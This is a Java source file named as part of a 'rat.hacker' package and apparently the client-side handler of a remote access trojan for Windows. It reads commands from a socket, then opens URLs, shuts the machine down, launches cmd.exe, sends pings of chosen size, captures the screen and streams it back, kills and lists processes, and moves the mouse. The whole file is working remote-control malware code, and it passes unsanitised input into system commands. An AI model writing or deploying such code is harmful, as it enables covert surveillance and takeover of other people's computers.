package com.rat.hacker;

/**
 * @author Bar771
 * https://Bar771.tumblr.com
 */

import java.net.Socket;
import java.net.InetAddress;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.io.InputStream;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;

class Client extends Thread{
	
	private int id;
	private Rat rat;
	
	private Socket socket;
	private BufferedReader in;
	private PrintWriter out;
	private InetAddress addr;
	
	private Robot r;
	
	private boolean isRunning = false;
	
	/*
	 * @param rat
	 * @param id
	 * @param in
	 * @param out
	 * @param socket
	 */
	public Client(Rat rat, int id, BufferedReader in, PrintWriter out, Socket socket) {
		this.rat = rat;
		this.id = id;
		this.in = in;
		this.out = out;
		isRunning = true;
		this.socket = socket;
		this.addr = socket.getInetAddress();
		
		try {
			this.r = new Robot();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void run() {
		while(isRunning) {
			try {
				String line = in.readLine();
				
				//c:\Program Files\Internet Explorer\iexplore.exe
				if (line.startsWith("open") && line.split(" ").length > 1) {
					String uri = line.split(" ")[1]; // index 0 - 'open', index 1 - site's url.
					
					Runtime.getRuntime().exec("c:\\Program Files\\Internet Explorer\\iexplore.exe " + uri);
					System.out.println("[" + id + "] The site "+ uri + " has opened up via Internet Explorer." );
				}
				// shutdown -t [minutes]
				else if (line.startsWith("shutdown") && line.split(" ").length > 1) {
					String min = line.split(" ")[1];
					Runtime.getRuntime().exec("C:\\WINDOWS\\system32\\shutdown.exe -t " + min);
					System.out.println("[" + id + "] The computer is being rebooted.");
				}
				// cmd
				else if (line.startsWith("command")) {
					Runtime.getRuntime().exec("C:\\WINDOWS\\system32\\cmd.exe");
					System.out.println("[" + id + "] CMD has opened up.");
				}
				//ping
				else if (line.startsWith("ping") && line.split(" ").length > 1) {
					String address = line.split(" ")[1];
					String size = line.split(" ")[2];
					Runtime.getRuntime().exec("c:\\windows\\system32\\ping.exe -l " + size + " " + address);
					System.out.println("[" + id + "] Pingging ");
				}
				// Screenshot.
				else if (line.startsWith("screenshot")) {
					Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
					BufferedImage img = r.createScreenCapture(screenRect);
					int[] rgb = img.getRGB(0, 0, img.getWidth(), img.getHeight(), null, 0, img.getWidth());
					
					out.println(img.getWidth() + ":" + img.getHeight());
					out.flush();
					
					for (int a=0; a<rgb.length; a++) {
						if (a < rgb.length)
							out.println(rgb[a]);
						else
							out.println("null");
						out.flush();
					}
					//ImageIO.write(img, "PNG", new File(line.split(" ")[1] + ".png"));
					System.out.println("[" + id + "] Screenshoted.");
				}
				// Terminates specific process.
				else if (line.startsWith("terminate") && line.split(" ").length > 1) {
					String param = line.split(" ")[1];
					String pid = line.split(" ")[2];
					Runtime.getRuntime().exec("c:\\windows\\system32\\taskkill.exe " + param + " " + pid);
					System.out.println("[" + id + "] Terminated a file successfully !");
				}
				// Prints processes list.
				else if (line.startsWith("tasklist")) {
					Process p = Runtime.getRuntime().exec("c:\\windows\\system32\\tasklist.exe ");
					InputStream input = p.getInputStream();
					byte[] buffer = new byte[1000];
					input.read(buffer, 0, buffer.length);
					String msg = new String(buffer);
					out.println(msg.trim());
					out.flush();
				}
				// Move the mouse to some coordinate.
				else if (line.startsWith("mouse") && line.split(" ").length > 1) {
					int xMouse = Integer.parseInt(line.split(" ")[1]);
					int yMouse = Integer.parseInt(line.split(" ")[2]);
					r.mouseMove(xMouse, yMouse);
					System.out.println("[" + id + "] Moved the mouse to " + xMouse +"," + yMouse + " coordinate.");
				}
				// log the user out.
				else if (line.startsWith("exit")) {
					rat.getClient(id).socket.close(); // throws exception here.
					isRunning = false;
					rat.setClient(id, null);
				}
			} catch (Exception e) { 
				isRunning = false;
				try { 
					rat.getClient(id).socket.close(); 
				} catch(Exception e2) {}
				rat.setClient(id, null);
				e.printStackTrace();
				System.exit(-1);
			}
		}
	}
	
	public InetAddress getAddr() {
		return addr;
	}
	
	
}